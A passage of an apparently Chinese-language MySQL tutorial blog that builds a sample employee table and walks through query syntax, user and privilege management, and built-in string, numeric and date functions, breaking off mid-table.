<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table if exists employee;</span><br><span class="line">create table emp(</span><br><span class="line">id int comment &#x27;编号&#x27;,</span><br><span class="line">workno varchar(10) comment &#x27;工号&#x27;,</span><br><span class="line">name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class="line">gender char(1) comment &#x27;性别&#x27;,</span><br><span class="line">age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class="line">idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class="line">workaddress varchar(50) comment &#x27;工作地址&#x27;,</span><br><span class="line">entrydate date comment &#x27;入职时间&#x27;</span><br><span class="line">)comment &#x27;员工表&#x27;;</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (1, &#x27;00001&#x27;, &#x27;柳岩666&#x27;, &#x27;女&#x27;, 20, &#x27;123456789012345678&#x27;, &#x27;北京&#x27;, &#x27;2000-01-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (2, &#x27;00002&#x27;, &#x27;张无忌&#x27;, &#x27;男&#x27;, 18, &#x27;123456789012345670&#x27;, &#x27;北京&#x27;, &#x27;2005-09-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (3, &#x27;00003&#x27;, &#x27;韦一笑&#x27;, &#x27;男&#x27;, 38, &#x27;123456789712345670&#x27;, &#x27;上海&#x27;, &#x27;2005-08-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (4, &#x27;00004&#x27;, &#x27;赵敏&#x27;, &#x27;女&#x27;, 18, &#x27;123456757123845670&#x27;, &#x27;北京&#x27;, &#x27;2009-12-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (5, &#x27;00005&#x27;, &#x27;小昭&#x27;, &#x27;女&#x27;, 16, &#x27;123456769012345678&#x27;, &#x27;上海&#x27;, &#x27;2007-07-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (6, &#x27;00006&#x27;, &#x27;杨逍&#x27;, &#x27;男&#x27;, 28, &#x27;12345678931234567X&#x27;, &#x27;北京&#x27;, &#x27;2006-01-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (7, &#x27;00007&#x27;, &#x27;范瑶&#x27;, &#x27;男&#x27;, 40, &#x27;123456789212345670&#x27;, &#x27;北京&#x27;, &#x27;2005-05-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (8, &#x27;00008&#x27;, &#x27;黛绮丝&#x27;, &#x27;女&#x27;, 38, &#x27;123456157123645670&#x27;, &#x27;天津&#x27;, &#x27;2015-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (9, &#x27;00009&#x27;, &#x27;范凉凉&#x27;, &#x27;女&#x27;, 45, &#x27;123156789012345678&#x27;, &#x27;北京&#x27;, &#x27;2010-04-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (10, &#x27;00010&#x27;, &#x27;陈友谅&#x27;, &#x27;男&#x27;, 53, &#x27;123456789012345670&#x27;, &#x27;上海&#x27;, &#x27;2011-01-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (11, &#x27;00011&#x27;, &#x27;张士诚&#x27;, &#x27;男&#x27;, 55, &#x27;123567897123465670&#x27;, &#x27;江苏&#x27;, &#x27;2015-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (12, &#x27;00012&#x27;, &#x27;常遇春&#x27;, &#x27;男&#x27;, 32, &#x27;123446757152345670&#x27;, &#x27;北京&#x27;, &#x27;2004-02-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (13, &#x27;00013&#x27;, &#x27;张三丰&#x27;, &#x27;男&#x27;, 88, &#x27;123656789012345678&#x27;, &#x27;江苏&#x27;, &#x27;2020-11-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (14, &#x27;00014&#x27;, &#x27;灭绝&#x27;, &#x27;女&#x27;, 65, &#x27;123456719012345670&#x27;, &#x27;西安&#x27;, &#x27;2019-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (15, &#x27;00015&#x27;, &#x27;胡青牛&#x27;, &#x27;男&#x27;, 70, &#x27;12345674971234567X&#x27;, &#x27;西安&#x27;, &#x27;2018-04-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (16, &#x27;00016&#x27;, &#x27;周芷若&#x27;, &#x27;女&#x27;, 18, null, &#x27;北京&#x27;, &#x27;2012-06-01&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">字段列表</span><br><span class="line">FROM</span><br><span class="line">表名列表</span><br><span class="line">WHERE</span><br><span class="line">条件列表</span><br><span class="line">GROUP BY</span><br><span class="line">分组字段列表</span><br><span class="line">HAVING</span><br><span class="line">分组后条件列表</span><br><span class="line">ORDER BY</span><br><span class="line">排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">分页参数</span><br></pre></td></tr></table></figure>

<p>基本查询（不带任何条件） 条件查询（WHERE） 聚合函数（count、max、min、avg、sum） 分组查询（group by） 排序查询（order by） 分页查询（limit）</p>
<h3 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h3><p>1). 查询多个字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段1, 字段2, 字段3 ... FROM 表名 ;</span><br><span class="line">SELECT * FROM 表名 ;</span><br></pre></td></tr></table></figure>

<p>2). 字段设置别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段1 [ AS 别名1 ] , 字段2 [ AS 别名2 ] ... FROM 表名;</span><br><span class="line">SELECT 字段1 [ 别名1 ] , 字段2 [ 别名2 ] ... FROM 表名;</span><br></pre></td></tr></table></figure>

<p>3). 去除重复记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT 字段列表 FROM 表名;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<p>A. 查询指定字段 name, workno, age并返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,workno,age from emp;</span><br></pre></td></tr></table></figure>

<p>B. 查询返回所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id ,workno,name,gender,age,idcard,workaddress,entrydate from emp;</span><br><span class="line">select * from emp;</span><br></pre></td></tr></table></figure>

<p>C. 查询所有员工的工作地址,起别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress as &#x27;工作地址&#x27; from emp;</span><br><span class="line">-- as可以省略</span><br><span class="line">select workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>

<p>D. 查询公司员工的上班地址有哪些(不要重复)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>

<h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 WHERE 条件列表 ;</span><br></pre></td></tr></table></figure>

<p>2). 条件</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230306090357474.png" alt="image-20230306090357474"></p>
<p>eg</p>
<p>A. 查询年龄等于 88 的员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age = 88;</span><br></pre></td></tr></table></figure>

<p>B. 查询年龄小于 20 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &lt; 20;</span><br></pre></td></tr></table></figure>

<p>C. 查询年龄小于等于 20 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &lt;= 20;</span><br></pre></td></tr></table></figure>

<p>D. 查询没有身份证号的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard is null;</span><br></pre></td></tr></table></figure>

<p>E.查询有身份证号的员工信</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard is not null;</span><br></pre></td></tr></table></figure>

<p>F:查询年龄不等于 88 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age != 88;</span><br><span class="line">select * from emp where age &lt;&gt; 88;</span><br></pre></td></tr></table></figure>

<p>G. 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &gt;= 15 &amp;&amp; age &lt;= 20;</span><br><span class="line">select * from emp where age &gt;= 15 and age &lt;= 20;</span><br><span class="line">select * from emp where age between 15 and 20;</span><br></pre></td></tr></table></figure>

<p>H. 查询性别为 女 且年龄小于 25岁的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;女&#x27; and age &lt; 25;</span><br></pre></td></tr></table></figure>

<p>I. 查询年龄等于18 或 20 或 40 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age = 18 or age = 20 or age =40;</span><br><span class="line">select * from emp where age in(18,20,40);</span><br></pre></td></tr></table></figure>

<p>J. 查询姓名为两个字的员工信息 _ %</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where name like &#x27;__&#x27;;</span><br></pre></td></tr></table></figure>

<p>k. 查询身份证号最后一位是X的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard like &#x27;%X&#x27;;</span><br><span class="line">select * from emp where idcard like &#x27;_________________X&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>1). 介绍 将一列数据作为一个整体，进行纵向计算 。</p>
<p>2). 常见的聚合函数</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">count</td>
<td align="center">统计数量</td>
</tr>
<tr>
<td align="center">max</td>
<td align="center">最大值</td>
</tr>
<tr>
<td align="center">min</td>
<td align="center">最小值</td>
</tr>
<tr>
<td align="center">avg</td>
<td align="center">平均值</td>
</tr>
<tr>
<td align="center">sum</td>
<td align="center">求和</td>
</tr>
</tbody></table>
<p>A. 统计该企业员工数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from emp; -- 统计的是总记录数</span><br><span class="line">select count(idcard) from emp; -- 统计的是idcard字段不为null的记录数</span><br></pre></td></tr></table></figure>

<p>B. 统计该企业员工的平均年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select avg(age) from emp;</span><br></pre></td></tr></table></figure>

<p>C. 统计该企业员工的最大年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select max(age) from emp;</span><br></pre></td></tr></table></figure>

<p>D. 统计该企业员工的最小年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select min(age) from emp;</span><br></pre></td></tr></table></figure>

<p>E. 统计西安地区员工的年龄之和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sum(age) from emp where workaddress = &#x27;西安&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组</span><br><span class="line">后过滤条件 ];</span><br></pre></td></tr></table></figure>

<p>2). where与having区别</p>
<p>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组 之后对结果进行过滤。 </p>
<p>判断条件不同：where不能对聚合函数进行判断，而having可以。</p>
<p>A. 根据性别分组 , 统计男性员工 和 女性员工的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from emp group by gender ;</span><br></pre></td></tr></table></figure>

<p>B. 根据性别分组 , 统计男性员工 和 女性员工的平均年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, avg(age) from emp group by gender ;</span><br></pre></td></tr></table></figure>

<p>C. 查询年龄小于45的员工 , 并根据工作地址分组 , 获取员工数量大于等于3的工作地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress, count(*) address_count from emp where age &lt; 45 group by</span><br><span class="line">workaddress having address_count &gt;= 3;</span><br></pre></td></tr></table></figure>

<p>D. 统计各个工作地址上班的男性及女性员工的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress, gender, count(*) &#x27;数量&#x27; from emp group by gender , workaddress</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h3 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1 , 字段2 排序方式2 ;</span><br></pre></td></tr></table></figure>

<p>2). 排序方式</p>
<p>ASC : 升序(默认值) DESC: 降序</p>
<p>注意事项：</p>
<p> •如果是升序, 可以不指定排序方式ASC ; </p>
<p>• 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序 ;</p>
<p>A. 根据年龄对公司的员工进行升序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by age asc;</span><br><span class="line">select * from emp order by age;</span><br></pre></td></tr></table></figure>

<p>B. 根据入职时间, 对员工进行降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by entrydate desc;</span><br></pre></td></tr></table></figure>

<p>C. 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>

<h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数 ;</span><br></pre></td></tr></table></figure>

<p>A. 查询第1页员工数据, 每页展示10条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 0,10;</span><br><span class="line">select * from emp limit 10;</span><br></pre></td></tr></table></figure>

<p>B. 查询第2页员工数据, 每页展示10条记录 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 10,10;</span><br></pre></td></tr></table></figure>

<h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p>1). 查询年龄为20,21,22,23岁的女员工信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;女&#x27; and age in(20,21,22,23);</span><br></pre></td></tr></table></figure>

<p>2). 查询性别为 男 ，并且年龄在 20-40 岁(含)以内的姓名为三个字的员工。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;男&#x27; and ( age between 20 and 40 ) and name like</span><br><span class="line">&#x27;___&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 统计员工表中, 年龄小于60岁的 , 男性员工和女性员工的人数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from emp where age &lt; 60 group by gender;</span><br></pre></td></tr></table></figure>

<p>4). 查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按 入职时间降序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name , age from emp where age &lt;= 35 order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>

<p>5). 查询性别为男，且年龄在20-40 岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序， 年龄相同按入职时间升序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;男&#x27; and age between 20 and 40 order by age asc ,</span><br><span class="line">entrydate asc limit 5 ;</span><br></pre></td></tr></table></figure>

<h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>DQL执行顺序</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309085943559.png" alt="image-20230309085943559"></p>
<p>验证：</p>
<p>查询年龄大于15的员工姓名、年龄，并根据年龄进行升序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name , age from emp where age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>在查询时，我们给emp表起一个别名 e，然后在select 及 where中使用该别名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name , e.age from emp e where e.age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>可以正常的查询到结果,此时就说明： from 先执行, 然后 where 和 select 执行。</p>
<p>那 where 和 select 到底哪个先执行呢? </p>
<p>此时，此时我们可以给select后面的字段起别名，然后在 where 中使用这个别名，然后看看是否可 以执行成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name ename , e.age eage from emp e where eage &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>SQL报错了,可以得出结论: from 先执行，然后执行 where ， 再执行select 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name ename , e.age eage from emp e where e.age &gt; 15 order by eage asc;</span><br></pre></td></tr></table></figure>

<p>成功,就验证了: order by 是在select 语句之后执行的。</p>
<p><strong>综上所述，我们可以看到DQL语句的执行顺序为： from … where … group by … having … select … order by … limit …</strong></p>
<h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p>DCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访 问权限。</p>
<h3 id="管理用户"><a href="#管理用户" class="headerlink" title="管理用户"></a>管理用户</h3><p>1). 查询用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.user;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309090928741.png" alt="image-20230309090928741"></p>
<p>其中 Host代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以 远程访问的。 User代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一 个用户。</p>
<p>2). 创建用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED BY &#x27;密码&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 修改用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27; ;</span><br></pre></td></tr></table></figure>

<p>4). 删除用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP USER &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项:</span><br><span class="line">• 在MySQL中需要通过用户名@主机名的方式，来唯一标识一个用户。</span><br><span class="line">• 主机名可以使用 % 通配。</span><br><span class="line">• 这类SQL开发人员操作的比较少，主要是DBA（ Database Administrator 数据库管理员）使用。</span><br></pre></td></tr></table></figure>

<p>案例：</p>
<p>A. 创建用户itcast, 只能够在当前主机localhost访问, 密码123456;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user &#x27;itcast&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>B. 创建用户heima, 可以在任意主机访问该数据库, 密码123456;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user &#x27;heima&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>C. 修改用户heima的访问密码为1234;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;heima&#x27;@&#x27;%&#x27; identified with mysql_native_password by &#x27;1234&#x27;;</span><br></pre></td></tr></table></figure>

<p>D. 删除 itcast@localhost 用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop user &#x27;itcast&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><p>MySQL中定义了很多种权限,<a href="https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html">MySQL :: MySQL 8.0 Reference Manual :: 6.2.2 Privileges Provided by MySQL</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309092308658.png" alt="image-20230309092308658"></p>
<p>1). 查询权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>

<p>2). 授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT 权限列表 ON 数据库名.表名 TO &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 撤销权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REVOKE 权限列表 ON 数据库名.表名 FROM &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项：</span><br><span class="line">• 多个权限之间，使用逗号分隔</span><br><span class="line">• 授权时， 数据库名和表名可以使用 * 进行通配，代表所有。</span><br></pre></td></tr></table></figure>

<p>案例:</p>
<p>A. 查询 ‘heima‘@’%’ 用户的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show grants for &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<p>B. 授予 ‘heima‘@’%’ 用户itcast数据库所有表的所有操作权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on itcast.* to &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<p>C. 撤销 ‘heima‘@’%’ 用户的itcast数据库的所有权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke all on itcast.* from &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>函数 是指一段可以直接被另一段程序调用的程序或代码。</p>
<p>问题：</p>
<p>1). 在企业的OA或其他的人力系统中，经常会提供的有这样一个功能，每一个员工登录上来之后都能 够看到当前员工入职的天数。 而在数据库中，存储的都是入职日期，如 2000-11-12，那如果快速计 算出天数呢？</p>
<p> 2). 在做报表这类的业务需求中,我们要展示出学员的分数等级分布。而在数据库中，存储的是学生的 分数值，如98&#x2F;75，如何快速判定分数的等级呢？ </p>
<p>其实，上述的这一类的需求呢，我们通过MySQL中的函数都可以很方便的实现 。 MySQL中的函数主要分为以下四类： 字符串函数、数值函数、日期函数、流程函数。</p>
<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CONCAT(S1,S2,…Sn)</td>
<td align="center">字符串拼接，将S1，S2，… Sn拼接成一个字符串</td>
</tr>
<tr>
<td align="center">LOWER(str)</td>
<td align="center">将字符串str全部转为小写</td>
</tr>
<tr>
<td align="center">UPPER(str)</td>
<td align="center">将字符串str全部转为大写</td>
</tr>
<tr>
<td align="center">LPAD(str,n,pad)</td>
<td align="center">左填充，用字符串pad对str的左边进行填充，达到n个字符 串长度</td>
</tr>
<tr>
<td align="center">RPAD(str,n,pad)</td>
<td align="center">右填充，用字符串pad对str的右边进行填充，达到n个字符 串长度</td>
</tr>
<tr>
<td align="center">TRIM(str)</td>
<td align="center">去掉字符串头部和尾部的空格</td>
</tr>
<tr>
<td align="center">SUBSTRING(str,start,len)</td>
<td align="center">返回从字符串str从start位置起的len个长度的字符串</td>
</tr>
</tbody></table>
<p>由于业务需求变更，企业员工的工号，统一为5位数，目前不足5位数的全部在前面补0。比如： 1号员 工的工号应该为00001。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update emp set workno = lpad(workno, 5, &#x27;0&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h3><p>常见的数值函数如下：</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CEIL(x)</td>
<td align="center">向上取整</td>
</tr>
<tr>
<td align="center">向上取整</td>
<td align="center">向下取整</td>
</tr>
<tr>
<td align="center">MOD(x,y)</td>
<td align="center">返回x&#x2F;y的模</td>
</tr>
<tr>
<td align="center">RAND()</td>
<td align="center">返回0~1内的随机数</td>
</tr>
<tr>
<td align="center">ROUND(x,y)</td>
<td align="center">求参数x的四舍五入的值，保留y位小数</td>
</tr>
</tbody></table>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 数值函数</span><br><span class="line">-- ceil</span><br><span class="line">select ceil(1.1);</span><br><span class="line"></span><br><span class="line">-- floor</span><br><span class="line">select floor(1.9);</span><br><span class="line"></span><br><span class="line">-- mod</span><br><span class="line">select mod(7,4);</span><br><span class="line"></span><br><span class="line">-- rand</span><br><span class="line">select rand();</span><br><span class="line"></span><br><span class="line">-- round</span><br><span class="line">select round(2.344,2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 案例: 通过数据库的函数，生成一个六位数的随机验证码。</span><br><span class="line">select lpad(round(rand()*1000000 , 0), 6, &#x27;0&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><p>常见的日期函数如下：</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CURDATE()</td>
<td align="center">返回当前日期</td>
</tr>
<tr>
<td align="center">CURTIME()</td>
<td align="center">返回当前时间</td>
</tr>
<tr>
<td align="center">NOW()</td>
<td align="center">返回当前日期和时间</td>
</tr>
<tr>
<td align="center">YEAR(date)</td>
<td align="center">获取指定date的年份</td>
</tr>
<tr>
<td align="center">MONTH(date)</td>
<td align="center">获取指定date的月份</td>
</tr>
<tr>
<td align="center">DAY(date)</td>
<td align="center">获取指定date的日期</td>
</tr>
<tr>
<td align="center">DATE_ADD(date, INTERVAL expr type)</td>
<td align="center">返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</td>
</tr>
<tr>
<td align="center">DATEDIFF(date1,date2)</td>
<td align="center">返回起始时间date1 和 结束时间date2之间的天数</td>
</tr>
</tbody></table>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 案例: 查询所有员工的入职天数，并根据入职天数倒序排序。</span><br><span class="line">select name, datediff(curdate(), entrydate) as &#x27;entrydays&#x27; from emp order by entrydays desc;</span><br></pre></td></tr></table></figure>

<h3 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">IF(value, t, f)</td>
<td align="center">如果value为true，则返回t，否则返回f</td>
</tr>
<tr>
<td align="center">IFNULL(value1, value2)</td>
<td align="center">如果value1不为空，返回value1，否则返回value2</td>
</tr>
<tr>
<td align="center">CASE WHEN [val1] THEN [res1] … ELSE [default] END</td>
